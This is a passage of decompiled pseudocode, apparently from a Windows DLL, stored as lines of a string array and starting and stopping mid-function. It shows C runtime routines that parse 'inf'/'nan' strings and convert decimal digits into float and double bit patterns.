    "    v5 = *(_BYTE *)(*a2)++;",
    "    *a1 = v5;",
    "    if ( v3 == 4 )",
    "      return 1;",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "char __fastcall sub_18001B2DC(_BYTE *a1, _QWORD *a2)",
    "{",
    "  char v2; // r8",
    "  __int64 v3; // r9",
    "  char v5; // cl",
    "",
    "  v2 = 0;",
    "  v3 = 0;",
    "  while ( *a1 == aSnan[v3] || *a1 == aSnan_0[v3] )",
    "  {",
    "    ++v3;",
    "    v5 = *(_BYTE *)(*a2)++;",
    "    *a1 = v5;",
    "    if ( v3 == 5 )",
    "      return 1;",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001B324(int a1, __int64 a2, unsigned int *a3)",
    "{",
    "  int v3; // ecx",
    "  int v4; // ecx",
    "  int v5; // ecx",
    "  unsigned int v6; // ecx",
    "  __int64 result; // rax",
    "  int v8; // ecx",
    "  int v9; // ecx",
    "  int v10; // ecx",
    "  unsigned int *v11; // [rsp+20h] [rbp-18h] BYREF",
    "  char v12; // [rsp+28h] [rbp-10h]",
    "",
    "  if ( a1 > 5 )",
    "  {",
    "    v8 = a1 - 6;",
    "    if ( !v8 )",
    "    {",
    "      *a3 = -4194304;",
    "      return 0;",
    "    }",
    "    v9 = v8 - 1;",
    "    if ( v9 )",
    "    {",
    "      v10 = v9 - 1;",
    "      if ( !v10 )",
    "      {",
    "        result = 2;",
    "        *a3 = *(_BYTE *)(a2 + 776) != 0 ? 0x80000000 : 0;",
    "        return result;",
    "      }",
    "      if ( v10 == 1 )",
    "      {",
    "        result = 3;",
    "        *a3 = *a3 & 0x7F800000 | (*(_BYTE *)(a2 + 776) != 0 ? -8388608 : 2139095040) & 0xFF800000;",
    "        return result;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      *a3 = 0;",
    "    }",
    "    return 1;",
    "  }",
    "  if ( a1 == 5 )",
    "  {",
    "    v6 = *a3 & 0x7F800000 | (*(_BYTE *)(a2 + 776) != 0 ? -8388608 : 2139095040) & 0xFF800001 | 1;",
    "    goto LABEL_9;",
    "  }",
    "  if ( !a1 )",
    "  {",
    "    v11 = a3;",
    "    v12 = 0;",
    "    return sub_18001BC94(a2, &v11);",
    "  }",
    "  v3 = a1 - 1;",
    "  if ( !v3 )",
    "  {",
    "    v11 = a3;",
    "    v12 = 0;",
    "    return sub_18001DB14(a2, &v11);",
    "  }",
    "  v4 = v3 - 1;",
    "  if ( !v4 )",
    "  {",
    "    v6 = *(_BYTE *)(a2 + 776) != 0 ? 0x80000000 : 0;",
    "    goto LABEL_9;",
    "  }",
    "  v5 = v4 - 1;",
    "  if ( !v5 )",
    "  {",
    "    v6 = *a3 & 0x7F800000 | (*(_BYTE *)(a2 + 776) != 0 ? -8388608 : 2139095040) & 0xFF800000;",
    "    goto LABEL_9;",
    "  }",
    "  if ( v5 != 1 )",
    "    return 1;",
    "  v6 = *(_BYTE *)(a2 + 776) != 0 ? -1 : 0x7FFFFFFF;",
    "LABEL_9:",
    "  *a3 = v6;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001B494(int a1, __int64 a2, unsigned __int64 *a3)",
    "{",
    "  int v3; // ecx",
    "  int v4; // ecx",
    "  int v5; // ecx",
    "  unsigned __int64 v6; // rcx",
    "  __int64 result; // rax",
    "  int v8; // ecx",
    "  int v9; // ecx",
    "  int v10; // ecx",
    "  unsigned __int64 *v11; // [rsp+20h] [rbp-18h] BYREF",
    "  char v12; // [rsp+28h] [rbp-10h]",
    "",
    "  if ( a1 > 5 )",
    "  {",
    "    v8 = a1 - 6;",
    "    if ( !v8 )",
    "    {",
    "      *a3 = 0xFFF8000000000000uLL;",
    "      return 0;",
    "    }",
    "    v9 = v8 - 1;",
    "    if ( v9 )",
    "    {",
    "      v10 = v9 - 1;",
    "      if ( !v10 )",
    "      {",
    "        result = 2;",
    "        *a3 = -(__int64)(*(_BYTE *)(a2 + 776) != 0) & 0x8000000000000000uLL;",
    "        return result;",
    "      }",
    "      if ( v10 == 1 )",
    "      {",
    "        result = 3;",
    "        *a3 = *a3 & 0x7FF0000000000000LL",
    "            | ((-(__int64)(*(_BYTE *)(a2 + 776) != 0) & 0x8000000000000000uLL) + 0x7FF0000000000000LL)",
    "            & 0xFFF0000000000000uLL;",
    "        return result;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      *a3 = 0;",
    "    }",
    "    return 1;",
    "  }",
    "  if ( a1 == 5 )",
    "  {",
    "    v6 = *a3 & 0x7FF0000000000000LL",
    "       | ((-(__int64)(*(_BYTE *)(a2 + 776) != 0) & 0x8000000000000000uLL) + 0x7FF0000000000000LL)",
    "       & 0xFFF0000000000001uLL",
    "       | 1;",
    "    goto LABEL_9;",
    "  }",
    "  if ( !a1 )",
    "  {",
    "    v11 = a3;",
    "    v12 = 1;",
    "    return sub_18001BC94(a2, &v11);",
    "  }",
    "  v3 = a1 - 1;",
    "  if ( !v3 )",
    "  {",
    "    v11 = a3;",
    "    v12 = 1;",
    "    return sub_18001DB14(a2, &v11);",
    "  }",
    "  v4 = v3 - 1;",
    "  if ( !v4 )",
    "  {",
    "    v6 = -(__int64)(*(_BYTE *)(a2 + 776) != 0) & 0x8000000000000000uLL;",
    "    goto LABEL_9;",
    "  }",
    "  v5 = v4 - 1;",
    "  if ( !v5 )",
    "  {",
    "    v6 = *a3 & 0x7FF0000000000000LL",
    "       | ((-(__int64)(*(_BYTE *)(a2 + 776) != 0) & 0x8000000000000000uLL) + 0x7FF0000000000000LL)",
    "       & 0xFFF0000000000000uLL;",
    "    goto LABEL_9;",
    "  }",
    "  if ( v5 != 1 )",
    "    return 1;",
    "  v6 = (-(__int64)(*(_BYTE *)(a2 + 776) != 0) & 0x8000000000000000uLL) + 0x7FFFFFFFFFFFFFFFLL;",
    "LABEL_9:",
    "  *a3 = v6;",
    "  return 0;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_18001B674(_BYTE *a1, __int128 *a2)",
    "{",
    "  _OWORD *v3; // rsi",
    "  __int128 v4; // xmm0",
    "  __int64 v5; // rax",
    "  int v6; // eax",
    "",
    "  a1[24] = 0;",
    "  v3 = a1 + 8;",
    "  if ( a2 )",
    "  {",
    "    v4 = *a2;",
    "LABEL_5:",
    "    *v3 = v4;",
    "    return a1;",
    "  }",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v4 = *(_OWORD *)&off_18004B498;",
    "    goto LABEL_5;",
    "  }",
    "  v5 = sub_1800262FC();",
    "  *(_QWORD *)a1 = v5;",
    "  *(_QWORD *)v3 = *(_QWORD *)(v5 + 144);",
    "  *((_QWORD *)a1 + 2) = *(_QWORD *)(v5 + 136);",
    "  sub_180024BB0(v5, v3);",
    "  sub_180024C1C(*(_QWORD *)a1, a1 + 16);",
    "  v6 = *(_DWORD *)(*(_QWORD *)a1 + 936LL);",
    "  if ( (v6 & 2) == 0 )",
    "  {",
    "    *(_DWORD *)(*(_QWORD *)a1 + 936LL) = v6 | 2;",
    "    a1[24] = 1;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001B710(_BYTE *a1)",
    "{",
    "  if ( !a1[8] )",
    "  {",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x18001B748LL);",
    "  }",
    "  return *(_QWORD *)a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001B74C(_BYTE *a1)",
    "{",
    "  if ( a1[8] )",
    "  {",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x18001B784LL);",
    "  }",
    "  return *(_QWORD *)a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001B788(unsigned __int64 a1, int a2, unsigned __int8 a3, char a4, __int64 a5)",
    "{",
    "  __int64 v5; // rsi",
    "  int v7; // r15d",
    "  unsigned __int64 v8; // rbx",
    "  bool v9; // zf",
    "  int v10; // ecx",
    "  int v11; // ecx",
    "  __int64 v12; // r10",
    "  char v13; // dl",
    "  int v14; // ebp",
    "  int v15; // edi",
    "  int v16; // r8d",
    "  int v17; // r9d",
    "  int v18; // r13d",
    "  __int64 v19; // r12",
    "  bool v20; // r15",
    "  int v21; // eax",
    "  unsigned __int8 v22; // al",
    "  __int64 *v23; // rcx",
    "  char v25; // cl",
    "  unsigned int v26; // ebp",
    "  __int64 v27; // r12",
    "  bool v28; // r15",
    "  int v29; // eax",
    "  unsigned __int8 v30; // al",
    "  __int64 *v31; // r8",
    "  __int64 *v32; // r9",
    "  __int64 v33; // r8",
    "  int v34; // [rsp+70h] [rbp+8h]",
    "",
    "  v5 = a3;",
    "  v7 = a2;",
    "  v8 = a1;",
    "  if ( a1 <= 0xFFFFFFFF )",
    "  {",
    "    v9 = !_BitScanReverse((unsigned int *)&a1, a1);",
    "    if ( v9 )",
    "      v11 = 0;",
    "    else",
    "      v11 = a1 + 1;",
    "  }",
    "  else",
    "  {",
    "    v9 = !_BitScanReverse((unsigned int *)&a1, HIDWORD(a1));",
    "    if ( v9 )",
    "      v10 = 0;",
    "    else",
    "      v10 = a1 + 1;",
    "    v11 = v10 + 32;",
    "  }",
    "  v12 = a5;",
    "  v13 = *(_BYTE *)(a5 + 8);",
    "  v14 = (v13 != 0 ? 53 : 24) - v11;",
    "  v15 = v7 - v14;",
    "  v16 = v13 != 0 ? 1023 : 127;",
    "  if ( v7 - v14 > v16 )",
    "    goto LABEL_65;",
    "  if ( v15 < (v13 != 0 ? -1022 : -126) )",
    "  {",
    "    v17 = v16 + v7 - 1;",
    "    v15 = -v16;",
    "    v34 = v17;",
    "    if ( v17 < 0 )",
    "    {",
    "      v18 = -v17;",
    "      if ( (unsigned int)-v17 >= 0x40 )",
    "      {",
    "        v8 = 0;",
    "LABEL_33:",
    "        v13 = *(_BYTE *)(v12 + 8);",
    "        if ( !v8 )",
    "        {",
    "          v23 = *(__int64 **)v12;",
    "          if ( v13 )",
    "            *v23 = v5 << 63;",
    "          else",
    "            *(_DWORD *)v23 = (_DWORD)v5 << 31;",
    "          return 2;",
    "        }",
    "        if ( v8 > (-(__int64)(v13 != 0) & 0xFFFFFFF800000uLL) + 0x7FFFFF )",
    "          v15 = v7 - v17 - v14 - 1;",
    "        goto LABEL_72;",
    "      }",
    "      v19 = v8 & (1LL << ((unsigned __int8)v18 - 1));",
    "      v20 = !a4 || (((1LL << ((unsigned __int8)v18 - 1)) - 1) & v8) != 0;",
    "      if ( !v19 && !v20 )",
    "        goto LABEL_31;",
    "      v21 = sub_180028050();",
    "      if ( v21 )",
    "      {",
    "        if ( v21 != 256 )",
    "        {",
    "          v17 = v34;",
    "          v12 = a5;",
    "          if ( v21 == 512 )",
    "          {",
    "            v22 = v5 ^ 1;",
    "LABEL_32:",
    "            v7 = a2;",
    "            v8 = v22 + (v8 >> v18);",
    "            goto LABEL_33;",
    "          }",
    "LABEL_31:",
    "          v22 = 0;",
    "          goto LABEL_32;",
    "        }",
    "        v22 = v5;",
    "      }",
    "      else",
    "      {",
    "        if ( !v19 || !v20 && (v8 & (1LL << v18)) == 0 )",
    "        {",
    "          v17 = v34;",
    "          v12 = a5;",
    "          goto LABEL_31;",
    "        }",
    "        v22 = 1;",
    "      }",
    "      v17 = v34;",
    "      v12 = a5;",
    "      goto LABEL_32;",
    "    }",
    "    v25 = v16 + v7 - 1;",
    "    goto LABEL_71;",
    "  }",
    "  if ( v14 >= 0 )",
    "  {",
    "    if ( v14 > 0 )",
    "    {",
    "      v25 = (v13 != 0 ? 53 : 24) - v11;",
    "LABEL_71:",
    "      v8 <<= v25;",
    "    }",
    "LABEL_72:",
    "    v32 = *(__int64 **)v12;",
    "    v33 = v8 & ((-(__int64)(v13 != 0) & 0xFFFFFFF800000LL) + 0x7FFFFF);",
    "    if ( v13 )",
    "      *v32 = v33 | (((v5 << 11) | ((_WORD)v15 + 1023) & 0x7FF) << 52);",
    "    else",
    "      *(_DWORD *)v32 = v33 & 0x7FFFFF | ((_DWORD)v5 << 31) | ((v15 + 127) << 23) & 0x7F800000;",
    "    return 0;",
    "  }",
    "  v26 = v11 - (*(_BYTE *)(a5 + 8) != 0 ? 53 : 24);",
    "  if ( v26 < 0x40 )",
    "  {",
    "    v27 = v8 & (1LL << ((unsigned __int8)v26 - 1));",
    "    v28 = !a4 || (((1LL << ((unsigned __int8)v26 - 1)) - 1) & v8) != 0;",
    "    if ( !v27 && !v28 )",
    "      goto LABEL_61;",
    "    v29 = sub_180028050();",
    "    if ( v29 )",
    "    {",
    "      if ( v29 != 256 )",
    "      {",
    "        v12 = a5;",
    "        if ( v29 == 512 )",
    "        {",
    "          v30 = v5 ^ 1;",
    "LABEL_62:",
    "          v8 = v30 + (v8 >> v26);",
    "          goto LABEL_63;",
    "        }",
    "LABEL_61:",
    "        v30 = 0;",
    "        goto LABEL_62;",
    "      }",
    "      v30 = v5;",
    "    }",
    "    else",
    "    {",
    "      if ( !v27 || !v28 && (v8 & (1LL << v26)) == 0 )",
    "      {",
    "        v12 = a5;",
    "        goto LABEL_61;",
    "      }",
    "      v30 = 1;",
    "    }",
    "    v12 = a5;",
    "    goto LABEL_62;",
    "  }",
    "  v8 = 0;",
    "LABEL_63:",
    "  v13 = *(_BYTE *)(v12 + 8);",
    "  if ( v8 <= (-(__int64)(v13 != 0) & 0x1FFFFFFF000000uLL) + 0xFFFFFF )",
    "    goto LABEL_72;",
    "  v8 >>= 1;",
    "  if ( ++v15 <= (v13 != 0 ? 1023 : 127) )",
    "    goto LABEL_72;",
    "LABEL_65:",
    "  v31 = *(__int64 **)v12;",
    "  if ( v13 )",
    "    *v31 = (v5 << 63) | 0x7FF0000000000000LL;",
    "  else",
    "    *(_DWORD *)v31 = ((_DWORD)v5 << 31) | 0x7F800000;",
    "  return 3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001BB34(_DWORD *a1, unsigned int a2, unsigned __int8 a3, char a4, __int64 a5)",
    "{",
    "  unsigned __int8 v6; // r15",
    "  unsigned int v8; // r10d",
    "  __int64 v9; // rdx",
    "  __int64 v10; // rax",
    "  char v11; // r9",
    "  unsigned __int64 v12; // rcx",
    "  char v13; // r8",
    "  __int64 v14; // rdi",
    "  __int64 v15; // rsi",
    "  __int64 v16; // r12",
    "  __int64 v17; // rbx",
    "  int v18; // r14d",
    "  int v19; // r8d",
    "  unsigned __int64 v20; // rbx",
    "  int v21; // edi",
    "  char v22; // r8",
    "  int v23; // r14d",
    "  __int64 v24; // rdi",
    "  char v25; // al",
    "  int v26; // ecx",
    "  char v27; // r9",
    "",
    "  v6 = a3;",
    "  v8 = 0;",
    "  v9 = *(_BYTE *)(a5 + 8) != 0 ? 52 : 23;",
    "  if ( a2 > 0x40 )",
    "  {",
    "    v13 = a2;",
    "    v14 = a2 >> 5;",
    "    v15 = (unsigned int)(v14 - 2);",
    "    v16 = (unsigned int)a1[v15 + 1];",
    "    v17 = (unsigned int)a1[(unsigned int)(v14 - 1) + 1];",
    "    v18 = 32 * (v14 - 2);",
    "    v19 = v13 & 0x1F;",
    "    if ( v19 )",
    "    {",
    "      v23 = v9 + v19 + v18;",
    "      LODWORD(v9) = a1[v14 + 1];",
    "      v24 = (unsigned int)((1 << v19) - 1);",
    "      v20 = ((unsigned __int64)((unsigned int)v16 & ~((1 << v19) - 1)) >> v19)",
    "          + ((v24 & v9) << (64 - (unsigned __int8)v19))",
    "          + (v17 << (64 - (unsigned __int8)v19 - 32));",
    "      if ( a4 || (v25 = 1, ((unsigned int)v16 & (unsigned int)v24) != 0) )",
    "        v25 = 0;",
    "      v26 = 0;",
    "      if ( (_DWORD)v15 )",
    "      {",
    "        do",
    "        {",
    "          v27 = 0;",
    "          if ( !a1[v26 + 1] )",
    "            v27 = v25;",
    "          ++v26;",
    "          v25 = v27;",
    "        }",
    "        while ( v26 != (_DWORD)v15 );",
    "      }",
    "      v11 = v25;",
    "      LODWORD(v9) = v23;",
    "    }",
    "    else",
    "    {",
    "      LODWORD(v9) = v18 + v9;",
    "      v20 = v16 + (v17 << 32);",
    "      v11 = a4 ^ 1;",
    "      v21 = 0;",
    "      if ( (_DWORD)v15 )",
    "      {",
    "        do",
    "        {",
    "          v22 = 0;",
    "          if ( !a1[v21 + 1] )",
    "            v22 = v11;",
    "          ++v21;",
    "          v11 = v22;",
    "        }",
    "        while ( v21 != (_DWORD)v15 );",
    "      }",
    "    }",
    "    v12 = v20;",
    "    a3 = v6;",
    "  }",
    "  else",
    "  {",
    "    if ( *a1 )",
    "    {",
    "      v10 = (unsigned int)a1[1];",
    "      if ( *a1 > 1u )",
    "        v8 = a1[2];",
    "    }",
    "    else",
    "    {",
    "      v10 = 0;",
    "    }",
    "    v11 = a4 ^ 1;",
    "    v12 = v10 + ((unsigned __int64)v8 << 32);",
    "  }",
    "  return sub_18001B788(v12, v9, a3, v11, a5);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001BC94(__int64 a1, _BYTE *a2)",
    "{",
    "  int v2; // r10d",
    "  bool v3; // cf",
    "  __int64 v4; // rdx",
    "  unsigned int v5; // r14d",
    "  unsigned int v6; // eax",
    "  unsigned __int64 v7; // r15",
    "  unsigned int v8; // r13d",
    "  __int64 v9; // r8",
    "  unsigned __int8 *v10; // r10",
    "  unsigned __int64 v11; // r8",
    "  unsigned int v12; // r9d",
    "  __int64 v13; // rdx",
    "  unsigned __int64 v14; // rcx",
    "  unsigned int v15; // edx",
    "  __int64 v16; // rcx",
    "  unsigned __int64 v17; // r15",
    "  int v18; // eax",
    "  unsigned int v19; // eax",
    "  unsigned int v20; // ecx",
    "  int v21; // eax",
    "  __int64 v22; // rdi",
    "  __int64 v23; // rcx",
    "  __int64 v24; // rsi",
    "  __int64 v25; // rbx",
    "  unsigned int v26; // r10d",
    "  unsigned __int64 v27; // r8",
    "  unsigned int v28; // r9d",
    "  __int64 v29; // r10",
    "  __int64 v30; // rdx",
    "  unsigned __int64 v31; // rcx",
    "  __int64 v32; // rbx",
    "  unsigned __int64 v33; // r8",
    "  unsigned int v34; // r9d",
    "  __int64 v35; // rdx",
    "  unsigned __int64 v36; // rcx",
    "  char v37; // al",
    "  unsigned int v38; // r12d",
    "  _DWORD *v39; // rcx",
    "  _DWORD *v40; // rdx",
    "  unsigned int v41; // r9d",
    "  __int64 v42; // rsi",
    "  unsigned __int64 v43; // rdi",
    "  unsigned int v44; // r8d",
    "  __int64 v45; // rbx",
    "  int v46; // eax",
    "  unsigned __int64 v47; // rdx",
    "  unsigned int v48; // eax",
    "  __int64 v49; // rdx",
    "  unsigned __int64 v50; // rcx",
    "  unsigned __int64 v51; // r8",
    "  int v52; // r13d",
    "  unsigned int v53; // eax",
    "  unsigned __int64 v54; // r8",
    "  unsigned int v55; // r9d",
    "  __int64 v56; // rdx",
    "  unsigned __int64 v57; // rcx",
    "  unsigned int v58; // r8d",
    "  __int64 v59; // rcx",
    "  unsigned __int64 v60; // rdx",
    "  unsigned int v61; // r8d",
    "  unsigned int v62; // eax",
    "  unsigned int v63; // ecx",
    "  int v64; // eax",
    "  __int64 v65; // rdi",
    "  __int64 v66; // rcx",
    "  __int64 v67; // rsi",
    "  __int64 v68; // rbx",
    "  unsigned int v69; // r10d",
    "  unsigned __int64 v70; // r8",
    "  unsigned int v71; // r9d",
    "  __int64 v72; // r10",
    "  __int64 v73; // rdx",
    "  unsigned __int64 v74; // rcx",
    "  __int64 v75; // rbx",
    "  unsigned __int64 v76; // r8",
    "  unsigned int v77; // r9d",
    "  __int64 v78; // rdx",
    "  unsigned __int64 v79; // rcx",
    "  char v80; // al",
    "  unsigned __int64 *v81; // r8",
    "  char v82; // al",
    "  unsigned int v83; // r15d",
    "  _DWORD *v84; // r12",
    "  _DWORD *v85; // r13",
    "  unsigned int v86; // r9d",
    "  __int64 v87; // rsi",
    "  unsigned __int64 v88; // rbx",
    "  unsigned int v89; // r8d",
    "  __int64 v90; // rdi",
    "  int v91; // eax",
    "  unsigned __int64 v92; // rdx",
    "  unsigned int v93; // eax",
    "  __int64 v94; // rdx",
    "  unsigned __int64 v95; // rcx",
    "  unsigned __int64 v96; // r8",
    "  unsigned int v97; // r8d",
    "  __int64 v98; // rax",
    "  unsigned __int64 v99; // r8",
    "  unsigned int v100; // r9d",
    "  __int64 v101; // rdx",
    "  unsigned __int64 v102; // rcx",
    "  unsigned int v104; // ecx",
    "  __int64 v105; // rcx",
    "  int v106; // eax",
    "  int v107; // eax",
    "  bool v108; // zf",
    "  unsigned __int8 *v109; // rbx",
    "  unsigned int v110; // r15d",
    "  unsigned __int64 v111; // r12",
    "  unsigned int v112; // r13d",
    "  unsigned __int64 v113; // r8",
    "  unsigned int v114; // r9d",
    "  __int64 v115; // rdx",
    "  unsigned __int64 v116; // rcx",
    "  unsigned int v117; // r8d",
    "  __int64 v118; // rdx",
    "  unsigned __int64 v119; // rcx",
    "  int v120; // eax",
    "  unsigned int v121; // eax",
    "  unsigned int v122; // ecx",
    "  int v123; // eax",
    "  __int64 v124; // rdi",
    "  __int64 v125; // rcx",
    "  __int64 v126; // rsi",
    "  __int64 v127; // rbx",
    "  unsigned int v128; // r10d",
    "  rsize_t v129; // r9",
    "  unsigned int *v130; // r8",
    "  unsigned __int64 v131; // r8",
    "  unsigned int v132; // r9d",
    "  __int64 v133; // r10",
    "  __int64 v134; // rdx",
    "  unsigned __int64 v135; // rcx",
    "  char v136; // al",
    "  __int64 v137; // rbx",
    "  unsigned int v138; // r9d",
    "  __int64 v139; // rdx",
    "  unsigned __int64 v140; // rcx",
    "  _DWORD *v141; // rdx",
    "  unsigned int v142; // r11d",
    "  _DWORD *v143; // rcx",
    "  unsigned int v144; // eax",
    "  __int64 v145; // r9",
    "  _DWORD *v146; // r15",
    "  __int64 v147; // rsi",
    "  unsigned __int64 v148; // rbx",
    "  unsigned int v149; // r8d",
    "  __int64 v150; // rdi",
    "  int v151; // eax",
    "  unsigned __int64 v152; // rdx",
    "  unsigned int v153; // ecx",
    "  __int64 v154; // rdx",
    "  unsigned __int64 v155; // rcx",
    "  int v156; // r13d",
    "  int v157; // eax",
    "  unsigned int v158; // r8d",
    "  __int64 v159; // rcx",
    "  unsigned __int64 v160; // rdx",
    "  unsigned __int64 v161; // r8",
    "  unsigned int v162; // r9d",
    "  __int64 v163; // r10",
    "  __int64 v164; // rdx",
    "  unsigned __int64 v165; // rcx",
    "  unsigned int v166; // r13d",
    "  unsigned int v167; // ecx",
    "  bool v168; // sf",
    "  unsigned int v169; // eax",
    "  unsigned int v170; // r12d",
    "  int v171; // eax",
    "  __int64 v172; // rdi",
    "  __int64 v173; // rcx",
    "  __int64 v174; // rsi",
    "  __int64 v175; // rbx",
    "  unsigned int v176; // r9d",
    "  char v177; // al",
    "  unsigned __int64 v178; // r8",
    "  unsigned int v179; // r9d",
    "  __int64 v180; // r10",
    "  __int64 v181; // rdx",
    "  unsigned __int64 v182; // rcx",
    "  __int64 v183; // rbx",
    "  unsigned __int64 v184; // r8",
    "  unsigned int v185; // r9d",
    "  __int64 v186; // rdx",
    "  unsigned __int64 v187; // rcx",
    "  unsigned int *v188; // rdx",
    "  unsigned int v189; // r12d",
    "  unsigned int *v190; // rcx",
    "  unsigned int v191; // eax",
    "  __int64 v192; // r10",
    "  _QWORD *v193; // r13",
    "  __int64 v194; // rsi",
    "  unsigned __int64 v195; // rbx",
    "  unsigned int v196; // r8d",
    "  __int64 v197; // rdi",
    "  int v198; // eax",
    "  unsigned __int64 v199; // rdx",
    "  unsigned int v200; // ecx",
    "  __int64 v201; // rdx",
    "  unsigned __int64 v202; // rcx",
    "  int v203; // ecx",
    "  int v204; // eax",
    "  unsigned int v205; // edx",
    "  unsigned __int64 v206; // r8",
    "  unsigned int v207; // r9d",
    "  __int64 v208; // r10",
    "  __int64 v209; // rdx",
    "  unsigned __int64 v210; // rcx",
    "  char v211; // bl",
    "  __int64 v212; // rdx",
    "  int v213; // eax",
    "  int v214; // eax",
    "  unsigned int v215; // ecx",
    "  __int64 v216; // rcx",
    "  int v217; // eax",
    "  int v218; // eax",
    "  unsigned int v219; // ebx",
    "  unsigned int v220; // esi",
    "  unsigned int v221; // r8d",
    "  int v222; // ecx",
    "  int v223; // ecx",
    "  unsigned int v224; // edx",
    "  __int64 v225; // r11",
    "  __int64 v226; // rax",
    "  __int64 v227; // rcx",
    "  int v228; // r10d",
    "  int v229; // r9d",
    "  unsigned int v230; // ecx",
    "  __int64 v231; // rax",
    "  unsigned int v232; // edi",
    "  unsigned int v233; // eax",
    "  unsigned int v234; // r10d",
    "  bool v235; // cl",
    "  __int64 i; // rdx",
    "  unsigned int v237; // eax",
    "  unsigned int v238; // r9d",
    "  unsigned int v239; // r10d",
    "  unsigned int v240; // r9d",
    "  int v241; // ecx",
    "  int v242; // ecx",
    "  unsigned int v243; // edx",
    "  __int64 v244; // r11",
    "  __int64 v245; // rax",
    "  __int64 v246; // rcx",
    "  int v247; // edi",
    "  int v248; // r8d",
    "  __int64 v249; // rcx",
    "  unsigned __int64 v250; // rdx",
    "  char v251; // r9",
    "  int v252; // ecx",
    "  int v253; // ecx",
    "  unsigned int v254; // ecx",
    "  int v255; // ecx",
    "  char v256; // cl",
    "  unsigned int v257; // r11d",
    "  int v258; // ebx",
    "  unsigned int v259; // r8d",
    "  int v260; // [rsp+30h] [rbp-D0h]",
    "  unsigned int v261; // [rsp+30h] [rbp-D0h]",
    "  int v262; // [rsp+30h] [rbp-D0h]",
    "  unsigned int v263; // [rsp+34h] [rbp-CCh]",
    "  unsigned int v264; // [rsp+34h] [rbp-CCh]",
    "  unsigned int v265; // [rsp+34h] [rbp-CCh]",
    "  int v266; // [rsp+38h] [rbp-C8h]",
    "  int v267; // [rsp+38h] [rbp-C8h]",
    "  unsigned int v268; // [rsp+38h] [rbp-C8h]",
    "  unsigned int v269; // [rsp+3Ch] [rbp-C4h]",
    "  unsigned int v270; // [rsp+3Ch] [rbp-C4h]",
    "  unsigned int v271; // [rsp+3Ch] [rbp-C4h]",
    "  int v272; // [rsp+40h] [rbp-C0h]",
    "  unsigned int v273; // [rsp+40h] [rbp-C0h]",
    "  _DWORD *v274; // [rsp+48h] [rbp-B8h]",
    "  int v275; // [rsp+48h] [rbp-B8h]",
    "  unsigned int v276; // [rsp+50h] [rbp-B0h]",
    "  unsigned int v277; // [rsp+50h] [rbp-B0h]",
    "  unsigned __int8 *v280; // [rsp+68h] [rbp-98h]",
    "  unsigned int *v281; // [rsp+68h] [rbp-98h]",
    "  unsigned __int8 *v282; // [rsp+70h] [rbp-90h]",
    "  _DWORD *v283; // [rsp+78h] [rbp-88h]",
    "  _DWORD *v284; // [rsp+78h] [rbp-88h]",
    "  unsigned int v285; // [rsp+80h] [rbp-80h]",
    "  _BYTE v286[460]; // [rsp+94h] [rbp-6Ch] BYREF",
    "  unsigned int v287; // [rsp+260h] [rbp+160h] BYREF",
    "  _DWORD Destination[115]; // [rsp+264h] [rbp+164h] BYREF",
    "  unsigned int v289; // [rsp+430h] [rbp+330h] BYREF",
    "  _DWORD v290[115]; // [rsp+434h] [rbp+334h] BYREF",
    "  unsigned int v291; // [rsp+600h] [rbp+500h] BYREF",
    "  unsigned int v292[115]; // [rsp+604h] [rbp+504h] BYREF",
    "  unsigned int v293; // [rsp+7D0h] [rbp+6D0h]",
    "  _DWORD v294[115]; // [rsp+7D4h] [rbp+6D4h] BYREF",
    "  unsigned int v295; // [rsp+9A0h] [rbp+8A0h]",
    "  _DWORD Source[115]; // [rsp+9A4h] [rbp+8A4h] BYREF",
    "",
    "  v2 = *(_DWORD *)a1;",
    "  v3 = a2[8] != 0;",
    "  v4 = *(unsigned int *)(a1 + 4);",
    "  v276 = v3 ? 54 : 25;",
    "  v289 = 0;",
    "  if ( v2 < 0 )",
    "    v2 = 0;",
    "  v5 = 0;",
    "  v6 = v2;",
    "  LODWORD(v7) = 0;",
    "  if ( v2 >= (unsigned int)v4 )",
    "    v6 = v4;",
    "  v8 = 0;",
    "  v9 = v6 + a1 + 8;",
    "  v263 = v2 - v6;",
    "  v282 = (unsigned __int8 *)v9;",
    "  v10 = (unsigned __int8 *)(a1 + 8);",
    "  v280 = (unsigned __int8 *)(v4 + a1 + 8);",
    "  v272 = (_DWORD)v280 - v9;",
    "  v285 = (_DWORD)v280 - v9;",
    "  if ( a1 + 8 != v9 )",
    "  {",
    "    do",
    "    {",
    "      if ( v8 == 9 )",
    "      {",
    "        if ( v5 )",
    "        {",
    "          LODWORD(v11) = 0;",
    "          v12 = 0;",
    "          do",
    "          {",
    "            v13 = v12++;",
    "            v14 = (unsigned int)v11 + 1000000000LL * (unsigned int)v290[v13];",
    "            v290[v13] = v14;",
    "            v11 = HIDWORD(v14);",
    "          }",
    "          while ( v12 != v5 );",
    "          if ( HIDWORD(v14) )",
    "          {",
    "            if ( v289 >= 0x73 )",
    "            {",
    "              v5 = 0;",
    "              v289 = 0;",
    "            }",
    "            else",
    "            {",
    "              v290[v289] = HIDWORD(v14);",
    "              v5 = ++v289;",
    "            }",
    "          }",
    "          else",
    "          {",
    "            v5 = v289;",
    "          }",
    "          v9 = (__int64)v282;",
    "        }",
    "        if ( (_DWORD)v7 )",
    "        {",
    "          v15 = 0;",
    "          if ( !v5 )",
    "            goto LABEL_20;",
    "          do",
    "          {",
    "            v16 = v15++;",
    "            v17 = (unsigned int)v290[v16] + (unsigned __int64)(unsigned int)v7;",
    "            v290[v16] = v17;",
    "            v5 = v289;",
    "            v7 = HIDWORD(v17);",
    "          }",
    "          while ( v15 != v289 );",
    "          if ( (_DWORD)v7 )",
    "          {",
    "LABEL_20:",
    "            if ( v5 >= 0x73 )",
    "            {",
    "              v5 = 0;",
    "              v289 = 0;",
    "            }",
    "            else",
    "            {",
    "              v290[v5] = v7;",
    "              v5 = ++v289;",
